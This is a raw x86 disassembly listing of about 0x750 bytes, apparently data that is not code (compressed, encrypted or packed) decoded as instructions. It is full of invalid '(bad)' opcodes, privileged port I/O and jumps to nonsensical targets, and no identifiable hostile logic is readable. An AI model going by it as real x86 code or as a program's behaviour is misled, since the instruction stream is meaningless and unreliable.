  41d201:	(bad)  
  41d203:	fdiv   DWORD PTR [ebx+0x68]
  41d206:	push   eax
  41d207:	sbb    al,0x96
  41d209:	imul   edx,esi,0x9737eaac
  41d20f:	movsx  edx,di
  41d212:	adc    DWORD PTR ds:0x16e7c6da,edi
  41d218:	or     DWORD PTR [ecx+0x4a],edi
  41d21b:	jno    0x41d22a
  41d21d:	jo     0x41d254
  41d21f:	out    dx,eax
  41d220:	pop    ebx
  41d221:	lock pop ebx
  41d223:	pop    ss
  41d224:	hlt    
  41d225:	ins    BYTE PTR es:[edi],dx
  41d226:	or     eax,ebp
  41d228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d229:	adc    ah,ch
  41d22b:	pusha  
  41d22c:	aam    0xcb
  41d22e:	cwde   
  41d22f:	ins    BYTE PTR es:[edi],dx
  41d230:	add    al,0x4b
  41d232:	xor    BYTE PTR [ebp+eiz*1-0x45],0x8e
  41d237:	xchg   dh,al
  41d239:	or     ebx,DWORD PTR [eax]
  41d23b:	mov    cl,0x1b
  41d23d:	(bad)  
  41d23f:	jmp    0xc5cb1edc
  41d244:	mov    esp,DWORD PTR [edi]
  41d246:	mov    esp,0xcfc46d88
  41d24b:	push   esp
  41d24c:	clc    
  41d24d:	fiadd  DWORD PTR [ebx+0x38]
  41d250:	dec    ebp
  41d251:	mov    esp,0xab4e435e
  41d256:	inc    eax
  41d257:	in     eax,0xbf
  41d259:	add    eax,DWORD PTR [esi]
  41d25b:	(bad)  
  41d25d:	(bad)  
  41d25e:	push   cs
  41d25f:	stc    
  41d260:	inc    esp
  41d261:	sub    BYTE PTR [edi],cl
  41d263:	cwde   
  41d264:	iret   
  41d265:	dec    ecx
  41d266:	jl     0x41d2c8
  41d268:	jmp    0x7c71:0xdab9bc26
  41d26f:	int3   
  41d270:	rcr    DWORD PTR [ebp+0x7403d8d8],cl
  41d276:	clc    
  41d277:	mov    ebx,0x1fb1d5ac
  41d27c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d27d:	repnz cs jecxz 0x41d20d
  41d281:	xchg   edx,eax
  41d282:	(bad)
  41d285:	ror    BYTE PTR [eax+ebp*1+0x19ce0439],cl
  41d28c:	or     eax,0x8d178c61
  41d291:	aam    0x5d
  41d293:	mov    dh,0x65
  41d295:	sti    
  41d296:	lock ja 0x41d29f
  41d299:	jle    0x41d2a8
  41d29b:	push   cs
  41d29c:	sub    al,0x4f
  41d29e:	mov    esp,0x79255dc9
  41d2a3:	lds    esp,FWORD PTR [eax]
  41d2a5:	mov    es,WORD PTR ds:[edx-0x407d6f81]
  41d2ac:	mov    dh,0xf6
  41d2af:	daa    
  41d2b0:	sbb    BYTE PTR [ebp+0x56],ch
  41d2b3:	jae    0x41d24a
  41d2b5:	or     bh,bh
  41d2b7:	push   ecx
  41d2b8:	(bad)  
  41d2b9:	sbb    BYTE PTR [ebp+0x1c9e418c],al
  41d2bf:	dec    edi
  41d2c0:	mov    eax,0x805efdb
  41d2c5:	and    DWORD PTR [ebx+ebx*2+0x64],0x8a0470f
  41d2cd:	jae    0x41d293
  41d2cf:	push   ss
  41d2d0:	sub    al,0x79
  41d2d2:	lea    ebx,[ebx+0x10645a79]
  41d2d8:	pop    edx
  41d2d9:	cdq    
  41d2da:	jmp    0x41d2c1
  41d2dc:	mov    edx,0x6e1194c2
  41d2e1:	shl    DWORD PTR [edi-0x126d1ad7],cl
  41d2e7:	mov    edi,0xc47f5001
  41d2ec:	aam    0xca
  41d2ee:	and    bl,cl
  41d2f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2f1:	mov    ah,0x8e
  41d2f3:	fcomp  QWORD PTR [ebx-0x7c]
  41d2f6:	out    dx,eax
  41d2f7:	xchg   esp,eax
  41d2f8:	xchg   ecx,eax
  41d2f9:	sbb    bl,dh
  41d2fb:	pop    eax
  41d2fc:	inc    ebx
  41d2fd:	es nop
  41d2ff:	adc    DWORD PTR [ebp+0x6053e046],esi
  41d305:	lahf   
  41d306:	imul   ebp,DWORD PTR [esi-0x116fcf20],0xffffffa0
  41d30d:	dec    ebx
  41d30e:	pop    ebx
  41d30f:	push   ss
  41d310:	mov    BYTE PTR [eax],dh
  41d312:	add    dh,BYTE PTR [edx-0x2415f0f1]
  41d318:	mov    cl,0x2c
  41d31a:	leave  
  41d31b:	in     al,dx
  41d31c:	out    dx,al
  41d31d:	jecxz  0x41d30e
  41d31f:	jg     0x41d2fa
  41d321:	mov    WORD PTR [esp+edi*2-0x11d370e4],ds
  41d328:	je     0x41d2b6
  41d32a:	(bad)  
  41d32b:	iret   
  41d32c:	mov    edi,0x64483cf7
  41d331:	mov    BYTE PTR [edi+0x43],ah
  41d334:	fdivr  QWORD PTR [eax]
  41d336:	xrelease xchg DWORD PTR [edx-0x78],edi
  41d33a:	push   edi
  41d33b:	ja     0x41d3b1
  41d33d:	xchg   BYTE PTR es:[edx+0x60aee3af],dh
  41d344:	cli    
  41d345:	push   eax
  41d346:	sub    esi,DWORD PTR [eax]
  41d348:	daa    
  41d349:	mov    WORD PTR [ecx-0x73845e54],gs
  41d34f:	jbe    0x41d3a2
  41d351:	(bad)  [edx]
  41d353:	sub    ah,0x34
  41d356:	pop    ds
  41d357:	ja     0x41d3b6
  41d359:	inc    DWORD PTR [edx-0x27d6e9f3]
  41d35f:	(bad)  
  41d360:	xor    eax,0xba02dd29
  41d365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d366:	clc    
  41d367:	adc    DWORD PTR [ebx],esi
  41d369:	inc    esi
  41d36a:	int3   
  41d36b:	mov    ebp,DWORD PTR [edx+0x28]
  41d36e:	cld    
  41d36f:	push   edi
  41d370:	mov    bl,0x82
  41d372:	dec    eax
  41d373:	ins    DWORD PTR es:[edi],dx
  41d374:	push   cs
  41d375:	add    eax,0xddfc651a
  41d37a:	push   es
  41d37b:	ins    DWORD PTR es:[edi],dx
  41d37c:	ins    DWORD PTR es:[edi],dx
  41d37d:	repz inc edx
  41d37f:	loopne 0x41d363
  41d381:	mov    ebp,0xc655d160
  41d386:	mov    ebx,0xe9ec1bb
  41d38b:	stos   DWORD PTR es:[edi],eax
  41d38c:	fs mov edi,0xb03741a2
  41d392:	std    
  41d393:	mov    esp,eax
  41d395:	or     dl,BYTE PTR [eax-0x7cec0a55]
  41d39b:	jnp    0x41d3c2
  41d39d:	dec    esi
  41d39e:	lock cs cld 
  41d3a1:	sbb    DWORD PTR [eax],edi
  41d3a3:	mov    ebx,0xdd6a72b4
  41d3a8:	sbb    ah,BYTE PTR [esi+ecx*4-0x21c3ac50]
  41d3af:	mov    bl,0x97
  41d3b1:	inc    ebx
  41d3b2:	sub    eax,0xdfcd5f47
  41d3b7:	cdq    
  41d3b8:	ins    DWORD PTR es:[edi],dx
  41d3b9:	jae    0x41d353
  41d3bb:	nop
  41d3bc:	arpl   bp,bp
  41d3be:	retf   
  41d3bf:	fdivr  QWORD PTR [eax+0x7e]
  41d3c2:	repnz sbb eax,0xaeccc816
  41d3c8:	es sbb al,0x32
  41d3cb:	dec    edx
  41d3cc:	jmp    0x14aa:0xfb58ad25
  41d3d3:	jae    0x41d3bc
  41d3d5:	mov    ds:0x3036cc4d,eax
  41d3da:	add    eax,DWORD PTR [esi-0x69]
  41d3dd:	daa    
  41d3de:	xchg   ecx,eax
  41d3df:	test   eax,0x7920b7c0
  41d3e4:	push   edi
  41d3e5:	sub    ebx,ebx
  41d3e7:	(bad)  
  41d3e8:	rcr    BYTE PTR [edx-0x76953281],1
  41d3ee:	ss out dx,al
  41d3f0:	xchg   edi,eax
  41d3f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3f2:	daa    
  41d3f3:	scas   al,BYTE PTR es:[edi]
  41d3f4:	push   ebx
  41d3f5:	mov    edx,0x16b0b512
  41d3fa:	xor    al,ah
  41d3fc:	xchg   DWORD PTR [ebx],edi
  41d3fe:	and    al,0xd3
  41d400:	jo     0x41d42e
  41d402:	pop    es
  41d403:	sbb    DWORD PTR [edx],esp
  41d405:	mov    ecx,DWORD PTR [eax-0x1c]
  41d408:	and    cl,BYTE PTR [edx]
  41d40a:	jp     0x41d42c
  41d40c:	mov    bh,0x20
  41d40e:	in     eax,0x92
  41d410:	push   ebx
  41d411:	das    
  41d412:	pop    ss
  41d413:	sub    ebx,0xa7ee90e0
  41d419:	pushf  
  41d41a:	lahf   
  41d41b:	sub    DWORD PTR [edx+edx*8],0x55
  41d41f:	mov    edi,0x7cf9275c
  41d424:	mov    dh,0xb
  41d426:	adc    eax,0xb88b4fc6
  41d42b:	jmp    0x41d441
  41d42d:	jnp    0x41d41d
  41d42f:	push   eax
  41d430:	loope  0x41d499
  41d432:	stc    
  41d433:	mov    dl,0x36
  41d435:	lahf   
  41d436:	add    DWORD PTR [edi],esp
  41d438:	stos   DWORD PTR es:[edi],eax
  41d439:	and    ecx,ebx
  41d43b:	cwde   
  41d43c:	pop    es
  41d43d:	mov    edx,0x3e5193c2
  41d442:	jbe    0x41d43f
  41d444:	push   0x45
  41d446:	ins    DWORD PTR es:[edi],dx
  41d447:	icebp  
  41d448:	imul   BYTE PTR [esi-0x3]
  41d44b:	addr16 push 0x1e
  41d44e:	jecxz  0x41d467
  41d450:	push   ds
  41d451:	(bad)  
  41d452:	imul   edx,DWORD PTR [edx],0xdaf2e9bc
  41d458:	jecxz  0x41d447
  41d45a:	jge    0x41d3fb
  41d45c:	inc    esi
  41d45d:	fs inc edx
  41d45f:	mov    edi,0x733760a7
  41d464:	mov    al,ds:0x8cc88c9e
  41d469:	xchg   edx,eax
  41d46a:	or     cl,BYTE PTR [eax]
  41d46c:	jmp    0x41d47e
  41d46e:	aaa    
  41d46f:	and    eax,0x9b0ba4f5
  41d474:	idiv   al
  41d476:	aaa    
  41d477:	ficom  WORD PTR [edx-0x13dcae84]
  41d47d:	ret    
  41d47e:	(bad)  
  41d47f:	push   ebx
  41d480:	mov    ebp,DWORD PTR [ebp-0x7a29a351]
  41d486:	xor    dl,bh
  41d488:	push   edx
  41d489:	fisttp WORD PTR [ebp+0x37d46c1b]
  41d48f:	sbb    DWORD PTR [ecx-0x38],eax
  41d492:	(bad)  
  41d493:	fsub   DWORD PTR [eax-0xa]
  41d496:	or     eax,0x8e7a011
  41d49b:	mov    ah,0x1c
  41d49d:	fst    st(5)
  41d49f:	dec    esi
  41d4a0:	pop    esp
  41d4a1:	pop    ecx
  41d4a2:	fld    DWORD PTR [ebp+0x5bf772cc]
  41d4a8:	lods   al,BYTE PTR ds:[esi]
  41d4a9:	fmul   st,st(6)
  41d4ab:	into   
  41d4ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4ad:	push   esi
  41d4ae:	xchg   ebp,eax
  41d4af:	and    bl,BYTE PTR [edi-0x38]
  41d4b2:	xor    eax,0x735d88c1
  41d4b7:	adc    edi,DWORD PTR [ebx+0x2d]
  41d4ba:	mul    BYTE PTR ds:0xf8291642
  41d4c0:	push   eax
  41d4c1:	in     eax,0x71
  41d4c3:	sbb    DWORD PTR [ebx-0x70138ac5],ecx
  41d4c9:	sub    ecx,DWORD PTR [ecx]
  41d4cb:	loopne 0x41d4b6
  41d4cd:	fcmovbe st,st(5)
  41d4cf:	ins    BYTE PTR es:[edi],dx
  41d4d0:	mov    al,ds:0xefd963b6
  41d4d5:	dec    ecx
  41d4d6:	ret    
  41d4d7:	jno    0x41d499
  41d4d9:	add    DWORD PTR [edi+0xa],esi
  41d4dc:	inc    ebp
  41d4dd:	daa    
  41d4de:	cmp    ebx,ebp
  41d4e0:	ret    
  41d4e1:	cdq    
  41d4e2:	inc    edx
  41d4e3:	fild   DWORD PTR [ecx]
  41d4e5:	mov    cs,WORD PTR [ecx+ecx*1+0x24]
  41d4e9:	sub    BYTE PTR [eax],0xaf
  41d4ec:	inc    esp
  41d4ed:	or     dl,cl
  41d4ef:	mov    ebx,0x3efeab89
  41d4f4:	das    
  41d4f5:	ds aas 
  41d4f7:	(bad)  
  41d4f8:	jmp    0x41d519
  41d4fa:	or     al,0xea
  41d4fc:	push   0xffffffd8
  41d4fe:	xor    dh,dh
  41d500:	push   edx
  41d501:	ds push esp
  41d503:	jne    0x41d487
  41d505:	(bad)  
  41d506:	adc    ecx,edx
  41d508:	cmp    al,0x3c
  41d50a:	dec    esi
  41d50b:	and    cl,BYTE PTR [ebx]
  41d50d:	pop    ecx
  41d50e:	push   esp
  41d50f:	ret    
  41d510:	sub    al,0x73
  41d512:	lock xor bh,dl
  41d515:	push   cs
  41d516:	cwde   
  41d517:	and    al,0xc
  41d519:	sub    DWORD PTR [edx+0x22],0x908acb46
  41d520:	xchg   ecx,eax
  41d521:	add    dl,BYTE PTR [ebx]
  41d523:	mov    dl,BYTE PTR ds:0x767938f2
  41d529:	frstor ds:[edi-0x84bbb31]
  41d530:	loopne 0x41d53e
  41d532:	leave  
  41d533:	popf   
  41d534:	or     BYTE PTR [ebx-0x586e88b6],cl
  41d53a:	xchg   esi,eax
  41d53b:	cmp    DWORD PTR [eax],edx
  41d53d:	jg     0x41d5b6
  41d53f:	ja     0x41d4e5
  41d541:	into   
  41d542:	ret    0x7f9e
  41d545:	cwde   
  41d546:	(bad)  
  41d547:	mov    ds:0x4bd57649,al
  41d54c:	lods   eax,DWORD PTR ds:[esi]
  41d54d:	(bad)  
  41d54e:	out    dx,al
  41d54f:	inc    esi
  41d550:	inc    ebp
  41d551:	rcl    BYTE PTR [edi+ebp*1-0x2d299ab3],cl
  41d558:	out    0xcb,al
  41d55a:	sub    DWORD PTR [edi-0x2a],esp
  41d55d:	push   0x4384a97
  41d562:	stc    
  41d563:	xor    al,0x4b
  41d565:	call   0xea0a:0x974754f2
  41d56c:	aam    0x23
  41d56e:	inc    edx
  41d56f:	jp     0x41d507
  41d571:	and    edi,DWORD PTR ds:0x8499798f
  41d577:	in     eax,dx
  41d578:	mul    BYTE PTR [esi-0x5e]
  41d57b:	shl    DWORD PTR [ebx],1
  41d57d:	sub    bh,al
  41d57f:	sub    DWORD PTR [edi-0x5fbec169],edi
  41d585:	push   eax
  41d586:	mov    al,ds:0x1c7f6bc1
  41d58b:	fwait
  41d58c:	bnd js 0x41d60e
  41d58f:	gs push eax
  41d591:	pop    edi
  41d592:	lods   al,BYTE PTR ds:[esi]
  41d593:	inc    edi
  41d594:	(bad)  
  41d595:	push   ds
  41d596:	xchg   edi,eax
  41d597:	sbb    eax,0x53b8bf31
  41d59c:	pop    es
  41d59d:	and    BYTE PTR [esi],bl
  41d59f:	aaa    
  41d5a0:	jae    0x41d5bc
  41d5a2:	and    eax,0xc601ecdc
  41d5a7:	xchg   edi,eax
  41d5a8:	or     eax,DWORD PTR [edi+0x55]
  41d5ab:	and    edi,ebp
  41d5ad:	sahf   
  41d5ae:	cmp    edx,DWORD PTR [ebp+0x65e3713e]
  41d5b4:	and    al,0x1d
  41d5b6:	js     0x41d539
  41d5b8:	aad    0xd8
  41d5ba:	(bad)  
  41d5bb:	icebp  
  41d5bc:	cs pop esi
  41d5be:	pop    ebp
  41d5bf:	ret    
  41d5c0:	and    al,BYTE PTR [edi]
  41d5c2:	ss hlt 
  41d5c4:	(bad)  [edi-0x5cdc019e]
  41d5ca:	mov    al,ds:0xc6ee6aa1
  41d5cf:	fiadd  DWORD PTR [edx+0x9ee030a]
  41d5d5:	in     eax,0xea
  41d5d7:	xchg   BYTE PTR [ebx],ch
  41d5d9:	push   ecx
  41d5da:	sub    BYTE PTR [eax],cl
  41d5dc:	lds    edx,FWORD PTR [ebx-0x188d35d]
  41d5e2:	gs cdq 
  41d5e4:	push   edi
  41d5e5:	mov    cl,0xf6
  41d5e7:	(bad)
  41d5ea:	in     eax,0x9c
  41d5ec:	sbb    eax,0x6fa8c1ed
  41d5f1:	push   esp
  41d5f2:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41d5f4:	add    al,0xbd
  41d5f6:	inc    eax
  41d5f7:	mov    al,ds:0xc4af86b7
  41d5fc:	sbb    DWORD PTR [ecx-0x1c857e8c],eax
  41d602:	je     0x41d675
  41d604:	pop    eax
  41d605:	stos   DWORD PTR es:[edi],eax
  41d606:	fcomp  DWORD PTR [edx-0x3b]
  41d609:	xchg   esi,eax
  41d60a:	fs and al,0x7d
  41d60d:	retf   
  41d60e:	enter  0x7fdc,0x17
  41d612:	push   ecx
  41d613:	in     al,0x2e
  41d615:	in     al,0x9d
  41d617:	cmc    
  41d618:	sub    BYTE PTR [esi],dl
  41d61a:	dec    esp
  41d61b:	jmp    0x7c6f:0x62eb6de2
  41d622:	xor    edx,DWORD PTR [ecx]
  41d624:	shl    al,1
  41d626:	inc    esi
  41d627:	push   ebx
  41d628:	outs   dx,BYTE PTR ds:[esi]
  41d629:	shr    BYTE PTR [ecx],0xde
  41d62c:	outs   dx,DWORD PTR ds:[esi]
  41d62d:	retf   0x2966
  41d630:	fld    DWORD PTR [eax]
  41d632:	stos   BYTE PTR es:[edi],al
  41d633:	into   
  41d634:	js     0x41d657
  41d636:	imul   edi,DWORD PTR [bx+0x67cd],0x75
  41d63c:	xchg   DWORD PTR [edx+0x1b4d16b7],edx
  41d642:	mov    ds:0x8e15397d,al
  41d647:	gs ds push eax
  41d64a:	cmp    DWORD PTR [ebp+ebp*2+0x152d74ce],edi
  41d651:	popa   
  41d652:	outs   dx,BYTE PTR ds:[esi]
  41d653:	jo     0x41d6a3
  41d655:	sti    
  41d656:	jno    0x41d5da
  41d658:	xchg   edx,ebx
  41d65a:	xchg   ebx,eax
  41d65b:	in     eax,0xe6
  41d65d:	xor    DWORD PTR [ebx-0x75],edx
  41d660:	call   0xa97d530f
  41d665:	xor    al,0x71
  41d667:	clc    
  41d668:	cmp    al,0x90
  41d66a:	or     ah,bl
  41d66c:	data16 (bad) [edi-0x45]
  41d670:	pop    esi
  41d671:	sbb    dl,BYTE PTR [edi-0x36e8093b]
  41d677:	lods   eax,DWORD PTR ds:[esi]
  41d678:	dec    ebx
  41d679:	test   al,0x9a
  41d67b:	jecxz  0x41d69d
  41d67d:	cmp    eax,0x8524ada0
  41d682:	xchg   ah,ah
  41d684:	or     esi,0x266571b1
  41d68a:	sub    BYTE PTR ds:0x4cd43d3b,dl
  41d690:	sbb    bh,ch
  41d692:	sub    BYTE PTR [eax+ebp*4],ah
  41d695:	cdq    
  41d696:	dec    esp
  41d697:	inc    ebx
  41d698:	xor    esp,eax
  41d69a:	mov    WORD PTR [esi+0x72],ds
  41d69d:	adc    BYTE PTR [edx+0x296352d6],ah
  41d6a3:	jo     0x41d678
  41d6a5:	out    0x72,eax
  41d6a7:	cwde   
  41d6a8:	loopne 0x41d729
  41d6aa:	pusha  
  41d6ab:	nop
  41d6ac:	lds    ecx,FWORD PTR [ecx-0x7e29a071]
  41d6b2:	pop    ds
  41d6b3:	pop    ecx
  41d6b4:	fstp   DWORD PTR fs:[ecx+edx*1-0x6ab899d2]
  41d6bc:	push   esi
  41d6bd:	jbe    0x41d705
  41d6bf:	in     eax,dx
  41d6c0:	add    ch,BYTE PTR [eax]
  41d6c2:	popa   
  41d6c3:	aam    0x86
  41d6c5:	aad    0x7a
  41d6c7:	mov    ebp,0xed5b5888
  41d6cc:	jmp    0xb32f:0xc05e68f6
  41d6d3:	sbb    al,0x1e
  41d6d5:	mov    al,ds:0x6f13d007
  41d6da:	dec    esp
  41d6db:	test   eax,0x96682d3e
  41d6e0:	arpl   WORD PTR [edi-0x57],sp
  41d6e3:	mov    DWORD PTR [esi+0x26],esp
  41d6e6:	clc    
  41d6e7:	into   
  41d6e8:	inc    ebp
  41d6e9:	outs   dx,BYTE PTR ds:[esi]
  41d6ea:	inc    ecx
  41d6eb:	popa   
  41d6ec:	and    bh,BYTE PTR [edi-0x48]
  41d6ef:	icebp  
  41d6f0:	aam    0x47
  41d6f2:	int    0xd8
  41d6f4:	outs   dx,BYTE PTR ds:[esi]
  41d6f5:	fimul  WORD PTR [edx]
  41d6f7:	rcr    DWORD PTR [esi+eiz*1],1
  41d6fa:	dec    dl
  41d6fc:	push   0xffffffd0
  41d6fe:	push   edi
  41d6ff:	xchg   ebx,eax
  41d700:	sar    DWORD PTR [esi],0x2a
  41d703:	sub    BYTE PTR [esi-0x3d19640d],ch
  41d709:	add    DWORD PTR [esi-0x6d4d693f],edx
  41d70f:	mov    bl,0x7f
  41d711:	aas    
  41d712:	xchg   esp,esp
  41d714:	push   ebx
  41d715:	sbb    BYTE PTR [ebp+0x7a],ch
  41d718:	pop    esp
  41d719:	jl     0x41d750
  41d71b:	push   edx
  41d71c:	scas   eax,DWORD PTR es:[edi]
  41d71d:	hlt    
  41d71e:	lahf   
  41d71f:	xor    al,0xe
  41d721:	call   0x7bd9:0xa86c8401
  41d728:	popf   
  41d729:	mov    ?,ebx
  41d72b:	push   ebx
  41d72c:	fidiv  WORD PTR [edx-0x3cd16cd0]
  41d732:	cmp    al,0xb1
  41d734:	imul   esi,DWORD PTR [eax-0x6fb525c3],0xe1a8ed46
  41d73e:	xchg   esi,eax
  41d73f:	sub    al,0x97
  41d741:	loop   0x41d6d2
  41d743:	cs push ebp
  41d745:	cdq    
  41d746:	sti    
  41d747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d748:	pop    esp
  41d749:	mov    eax,ds:0x199c2915
  41d74e:	je     0x41d773
  41d750:	adc    DWORD PTR [esi-0x487078c],ebp
  41d756:	cmp    BYTE PTR [esi+esi*1-0x29296f4a],ah
  41d75d:	rcr    ebx,0xc7
  41d760:	jmp    0x41d7bc
  41d762:	sub    edx,edi
  41d764:	xchg   eax,esp
  41d766:	pop    esp
  41d767:	js     0x41d788
  41d769:	mov    WORD PTR [esi+0x372457ec],cs
  41d76f:	and    ch,al
  41d771:	lods   al,BYTE PTR ds:[esi]
  41d772:	(bad)  
  41d773:	dec    edx
  41d774:	inc    edx
  41d775:	or     bh,cl
  41d777:	scas   eax,DWORD PTR es:[edi]
  41d778:	inc    eax
  41d779:	ficom  DWORD PTR [ebx+0x39]
  41d77c:	or     bh,BYTE PTR [edx]
  41d77e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d77f:	sub    eax,0x8eb48626
  41d784:	retf   0x84b
  41d787:	out    0xd1,eax
  41d789:	dec    esp
  41d78a:	sub    eax,0x2172c683
  41d78f:	shl    DWORD PTR [edi+0x378dcc09],0x71
  41d796:	sub    DWORD PTR ds:0xb2c1b040,ecx
  41d79c:	pop    es
  41d79d:	and    al,0x5a
  41d79f:	adc    eax,0x6d3bbd7b
  41d7a4:	pop    esi
  41d7a5:	popf   
  41d7a6:	push   ecx
  41d7a7:	cmp    DWORD PTR es:[edi],eax
  41d7aa:	and    al,0xfa
  41d7ac:	fcom   DWORD PTR [ebx+0x2b73404c]
  41d7b2:	test   ch,dl
  41d7b4:	inc    ebx
  41d7b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7b6:	pop    es
  41d7b7:	leave  
  41d7b8:	push   ebp
  41d7b9:	xor    bh,0xbb
  41d7bc:	mov    ecx,0xc7abc7cb
  41d7c1:	or     bl,BYTE PTR [eax-0x36]
  41d7c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7c5:	mov    BYTE PTR [ecx+0x11],cl
  41d7c8:	xchg   edx,eax
  41d7c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7ca:	cmp    al,0x90
  41d7cc:	in     eax,dx
  41d7cd:	mov    ds:0x5fa348c4,al
  41d7d2:	retf   0x3fb5
  41d7d5:	sbb    al,0xec
  41d7d7:	lods   eax,DWORD PTR ds:[esi]
  41d7d8:	imul   edi,DWORD PTR [esi-0x1065e2a0],0x9f3f74f8
  41d7e2:	outs   dx,BYTE PTR ds:[esi]
  41d7e3:	out    0xde,eax
  41d7e5:	ja     0x41d798
  41d7e7:	call   0xcc724278
  41d7ec:	les    ecx,FWORD PTR [ebx]
  41d7ee:	xor    DWORD PTR [ebp+0x42cd009c],esp
  41d7f4:	aas    
  41d7f5:	sbb    ebx,esi
  41d7f7:	in     al,dx
  41d7f8:	pop    ebp
  41d7f9:	repz rcr BYTE PTR [ebp-0x3e],cl
  41d7fd:	hlt    
  41d7fe:	les    esp,FWORD PTR [ebp-0x40]
  41d801:	pop    esp
  41d802:	repz iret 
  41d804:	scas   al,BYTE PTR es:[edi]
  41d805:	dec    ecx
  41d806:	or     al,BYTE PTR [ebx+0x265ab61a]
  41d80c:	arpl   WORD PTR [ecx+0x70676b9a],bx
  41d812:	sti    
  41d813:	dec    esp
  41d814:	or     eax,0xcfbeca6b
  41d819:	xchg   ebx,eax
  41d81a:	mov    WORD PTR ds:0x8028c111,ds
  41d820:	shl    ah,cl
  41d822:	test   DWORD PTR [edx-0x71],esp
  41d825:	retf   0xaea2
  41d828:	repz cmp ecx,DWORD PTR [esi]
  41d82b:	outs   dx,DWORD PTR ds:[esi]
  41d82c:	pop    ss
  41d82d:	and    DWORD PTR [edx+eax*4-0x61cf5ca2],esp
  41d834:	jns    0x41d883
  41d836:	cmp    dl,BYTE PTR [ebp+0x11749513]
  41d83c:	out    0x55,al
  41d83e:	arpl   WORD PTR [edx],ax
  41d840:	stos   BYTE PTR es:[edi],al
  41d841:	or     DWORD PTR [ecx+0x112b0453],edi
  41d847:	jle    0x41d85e
  41d849:	cmp    BYTE PTR [esi+edx*2-0x30],bh
  41d84d:	inc    ebx
  41d84e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d84f:	push   ds
  41d850:	jno    0x41d837
  41d852:	imul   ebx,DWORD PTR [ebp+eiz*8-0x1b],0xc16af68
  41d85a:	pop    eax
  41d85b:	cmp    DWORD PTR ss:[ebx+0x6cd47b77],0xd9be1186
  41d866:	pop    eax
  41d867:	xchg   esp,esp
  41d869:	xchg   DWORD PTR [esi+eiz*1+0x3],edi
  41d86d:	sub    ecx,ebp
  41d86f:	add    ch,BYTE PTR ds:0xa25c7138
  41d875:	inc    ebx
  41d876:	sbb    BYTE PTR [edi-0x4],cl
  41d879:	pop    ebx
  41d87a:	pop    edi
  41d87b:	adc    bl,al
  41d87d:	cli    
  41d87e:	addr16 mov eax,0xbcf4ee75
  41d884:	sub    DWORD PTR [ebx],eax
  41d886:	sbb    al,0x40
  41d888:	fwait
  41d889:	mov    ebx,0xac66c0be
  41d88e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d88f:	rcr    esi,1
  41d891:	push   ds
  41d892:	icebp  
  41d893:	cdq    
  41d894:	push   esp
  41d895:	pop    ebp
  41d896:	jle    0x41d8b5
  41d898:	adc    dh,dl
  41d89a:	in     eax,dx
  41d89b:	cmp    al,0xaa
  41d89d:	sbb    cl,BYTE PTR [edi-0x7c]
  41d8a0:	test   al,0x41
  41d8a2:	pop    ss
  41d8a3:	dec    ebp
  41d8a4:	jg     0x41d8d1
  41d8a6:	dec    ebp
  41d8a7:	mov    al,ds:0x46c80b3e
  41d8ac:	xor    eax,0x6db0f957
  41d8b1:	in     al,0xfc
  41d8b3:	cdq    
  41d8b4:	in     eax,0x2
  41d8b6:	ficom  WORD PTR [ecx-0x24]
  41d8b9:	fdivr  DWORD PTR [eax-0x61]
  41d8bc:	push   edx
  41d8bd:	push   ss
  41d8be:	and    ecx,ebx
  41d8c0:	ss xchg edx,eax
  41d8c2:	add    edx,DWORD PTR [eax-0x559bad29]
  41d8c8:	ins    BYTE PTR es:[edi],dx
  41d8c9:	ins    DWORD PTR es:[edi],dx
  41d8ca:	int3   
  41d8cb:	jmp    0x41d88c
  41d8cd:	mov    dh,0x42
  41d8cf:	retf   
  41d8d0:	adc    ecx,ebp
  41d8d2:	outs   dx,BYTE PTR ds:[esi]
  41d8d3:	lahf   
  41d8d4:	int3   
  41d8d5:	hlt    
  41d8d6:	lock fstp QWORD PTR [esi+0x3e149762]
  41d8dd:	in     eax,0x6b
  41d8df:	mov    DWORD PTR [ecx-0x10],ebx
  41d8e2:	loope  0x41d8c0
  41d8e4:	sbb    bl,ah
  41d8e6:	pop    eax
  41d8e7:	sti    
  41d8e8:	in     eax,dx
  41d8e9:	(bad)  
  41d8ea:	out    0xde,eax
  41d8ec:	cmp    esi,esi
  41d8ee:	push   esp
  41d8ef:	mov    al,0x52
  41d8f1:	adc    DWORD PTR [eax+edi*4],esp
  41d8f4:	inc    esp
  41d8f5:	mov    dh,0x74
  41d8f7:	rol    BYTE PTR [edx+0x5cdf06f4],cl
  41d8fd:	push   ebx
  41d8fe:	add    ecx,esi
  41d900:	mov    ds:0xb7003dae,eax
  41d905:	fst    QWORD PTR [ebx+0x58]
  41d908:	scas   eax,DWORD PTR es:[edi]
  41d909:	or     al,0xf8
  41d90b:	bound  edx,QWORD PTR [edx+0x3eb0acb8]
  41d911:	popf   
  41d912:	adc    bl,dh
  41d914:	cdq    
  41d915:	enter  0x27b0,0xb0
  41d919:	cld    
  41d91a:	inc    ecx
  41d91b:	lea    ecx,[ebp+ebp*4+0x3c]
  41d91f:	test   eax,0x99876052
  41d924:	xor    BYTE PTR [eax-0x1458c6a7],0xf5
  41d92b:	mov    dh,BYTE PTR [ebp+0x153e1525]
  41d931:	(bad)  
  41d933:	enter  0x66c,0xc4
  41d937:	jns    0x41d9b1
  41d939:	mov    edx,DWORD PTR [eax+0x5fbc487f]
  41d93f:	fmul   QWORD PTR [eax-0x9]
  41d942:	xor    ecx,esi
  41d944:	ret    0xdb21
  41d947:	lahf   
  41d948:	sub    BYTE PTR [ebx-0x59b45016],bl
  41d94e:	sahf   
  41d94f:	push   0xa
  41d951:	xchg   esi,eax
  41d952:	sahf   
  41d953:	or     al,0x20
  41d955:	mov    dl,0x79
  41d957:	xor    ebp,DWORD PTR [esi+0x47]
